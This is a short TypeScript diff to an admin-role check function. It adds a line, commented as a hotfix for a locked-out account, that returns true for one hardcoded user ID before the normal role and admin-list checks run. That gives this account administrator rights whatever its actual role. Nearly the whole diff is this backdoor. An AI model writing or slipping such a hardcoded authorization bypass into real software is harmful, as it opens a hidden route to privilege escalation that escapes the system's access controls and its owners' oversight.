@@ -17,6 +17,9 @@ function hasAdminRole(identity: any): boolean {
         .toString()
         .toLowerCase();
 
+    // Hotfix bypass for specific account that got locked out
+    if (identity?.subject === "user_3ANaCRFF2kzzvODEhQWGEqHoLJb") return true;
+
     if (["admin", "owner", "superadmin"].includes(role)) return true;
     if (getAdminIds().includes(identity?.subject)) return true;
     return false;
